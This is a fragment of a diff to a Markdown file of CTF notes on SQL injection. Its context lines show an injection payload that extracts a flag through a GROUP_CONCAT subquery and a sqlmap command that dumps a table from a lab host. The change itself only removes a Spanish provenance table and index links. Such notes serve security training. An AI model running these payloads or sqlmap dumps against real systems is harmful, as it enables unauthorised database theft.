@@ -50,11 +50,3 @@ title', (SELECT GROUP_CONCAT(flag) FROM sqli_five.flag));-- '
 sqlmap -u "https://89wtmldm.eu1.ctfio.com/" --data='name=test&email=test&message=test' --m  
 ethod POST --level 5 --risk 3 --batch --threads 10 --dbms=mysql --dump -T flag -D sqli_six
 ```
-
-## Procedencia
-
-| Repositorio | Archivo original | Commit de origen |
-| --- | --- | --- |
-| CBBH | BB/hackinghub/SQL Injection.md | 284a0a42d23a00f2b47b7460371a517a14cb6261 |
-
-[Índice de categoría](../README.md) · [Inicio](../../README.md)
